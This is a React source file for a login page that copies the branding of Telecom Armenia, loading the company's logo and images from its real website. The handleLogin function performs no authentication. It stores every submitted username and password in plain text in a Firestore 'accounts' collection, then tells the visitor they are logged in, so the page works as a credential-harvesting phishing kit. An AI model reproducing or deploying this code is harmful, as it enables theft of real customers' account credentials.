import { useState, useEffect } from 'react'
import { collection, getDocs, addDoc, serverTimestamp } from 'firebase/firestore';
import { Link, useNavigate } from 'react-router-dom';
import { db } from "../firebase.js";
import { os } from '../Components/os.jsx';
import { os2 } from '../Components/os2.jsx';

function Login() {
  const [mainTab, setMainTab] = useState('Private Clients');
  const [loginMethod, setLoginMethod] = useState('phone');

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const navigate = useNavigate();

  const handleLogin = async (e) => {
  e.preventDefault();

  try {
    await addDoc(collection(db, "accounts"), {
      username: username,
      loginMethod: loginMethod,
      password: password,
      accountType: mainTab,
      timestamp: serverTimestamp(),
    });
    localStorage.setItem("isLoggedIn", "true"); 
    localStorage.setItem("username", username);

    navigate("/page1");

  } catch (error) {
    console.error("Login-ի սխալ. ", error);
  }
};

  return (
    <>
      <div className="grid grid-cols-[30%_60%] w-full h-[100vh] gap-[10%]" >
        <div className="">
          <div
            style={{
              width: '130px',
              height: '60px',
              backgroundImage: 'url(https://www.telecomarmenia.am/img/logo-light.svg?v=1)',
              marginLeft: '40%',
              marginTop: '40px',
            }}
          ></div>

          <div className="w-full ml-[10%] mt-[60px] max-w-md mx-auto bg-white p-6 rounded-xl shadow-sm border border-gray-100">
            <div className="flex border-b border-gray-200 mb-6 relative">
                {os("Private Clients", mainTab, setMainTab)}
                {os("Business", mainTab, setMainTab)}
            </div> 

            {mainTab === 'Private Clients' && (
              <>
                 <div className="flex border-b border-gray-200 mb-6 relative">
                    {os2("phone", "Phone number", loginMethod, setLoginMethod)}
                    {os2("email", "E-mail", loginMethod, setLoginMethod)}
                </div>

                <form onSubmit={handleLogin} className="space-y-4">
                  <div>
                    <label className="block text-xs font-medium text-gray-500 mb-1">
                      Username
                    </label>

                    {loginMethod === 'phone' ? (
                      <div>
                        <div className="flex items-center border border-gray-300 rounded-md focus-within:ring-1 focus-within:ring-[#00a896] focus-within:border-[#00a896]">
                          <span className="pl-3 pr-2 text-gray-500 text-sm select-none border-r border-gray-300 py-2.5">
                            +374
                          </span>
                          <input
                            type="tel"
                            placeholder="Enter your username"
                            className="w-full px-3 py-2.5 text-sm focus:outline-none bg-transparent"
                            value={username}
                            onChange={(e) => setUsername(e.target.value)}
                          />
                        </div>
                      </div>
                    ) : (
                      <div>
                        <input
                          type="email"
                          placeholder="Enter your email"
                          className="w-full px-3 py-2.5 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-[#00a896] focus:border-[#00a896]"
                          value={username}
                          onChange={(e) => setUsername(e.target.value)}
                        />
                      </div>
                    )}
                  </div>

                  <div>
                    <label className="block text-xs font-medium text-gray-500 mb-1">
                      Password
                    </label>
                    <div className="relative">
                      <input
                        type="password"
                        placeholder="Enter your password"
                        className="w-full px-3 py-2.5 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-[#00a896] focus:border-[#00a896]"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                      />
                      <button
                        type="button"
                        className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                      >
                        👁
                      </button>
                    </div>
                  </div>

                  <button
                    type="submit"
                    className="w-full py-3 bg-[#e34234] hover:bg-[#d23528] text-white font-medium text-sm rounded-md transition-colors"
                  >
                    Sign in
                  </button>

                  <div className="text-center pt-2">
                    <a href="#forgot" className="text-xs text-gray-600 hover:underline">
                      Forgot password?
                    </a>
                  </div>
                </form>
              </>
            )}

            {mainTab === 'Business' && (
  <form onSubmit={handleLogin} className="text-sm text-center py-8">
    <h1 className='text-[22px] mt-[-20px]'>Welcome to Team business account</h1>

    <div>
      <label className="block text-xs font-medium text-gray-500 mb-1">
        Select type
      </label>
      <div className="relative">
        <select name="" className='w-full px-3 py-2.5 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-[#00a896] focus:border-[#00a896]'>
          <option value="Admin">Admin</option>
          <option value="Partner">Partner</option>
        </select>
      </div>
    </div>

    <div>
      <label className="block text-xs font-medium text-gray-500 mb-1">
        Username
      </label>
      <div className="relative">
        <input
          type="text"
          placeholder="Enter your username"
          className="w-full px-3 py-2.5 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-[#00a896] focus:border-[#00a896]"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
        />
      </div>
    </div>

    <div>
      <label className="block text-xs font-medium text-gray-500 mb-1">
        Password
      </label>
      <div className="relative">
        <input
          type="password"
          placeholder="Enter your password"
          className="w-full px-3 py-2.5 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-[#00a896] focus:border-[#00a896]"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
        <button
          type="button"
          className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
        >
          👁
        </button>
      </div>
    </div>

    <button
      type="submit"
      className="w-full py-3 bg-[#e34234] hover:bg-[#d23528] text-white font-medium text-sm rounded-md transition-colors mt-[10px]"
    >
      Sign in
    </button>

    <div className="text-center pt-2">
      <a href="#forgot" className="text-xs text-gray-600 hover:underline">
        Forgot password?
      </a>
    </div>
  </form>
)}
          </div>
        </div>

        <div className="bg-[url(https://static.tildacdn.com/tild3066-6435-4130-a662-656537366333/IMG_0167b.jpg)] bg-no-repeat bg-[length:100%_100%] flex flex-col justify-center items-center">
          <h1 className='text-[60px] text-[#2c3843]'>PERSONAL ACCOUT</h1>
          <img src="https://www.telecomarmenia.am/myaccount/img/mobile-devices.png?v=3" className='w-[350px] h-[400px]' alt="" />
        </div>
      </div>
    </>
  );
}

export default Login;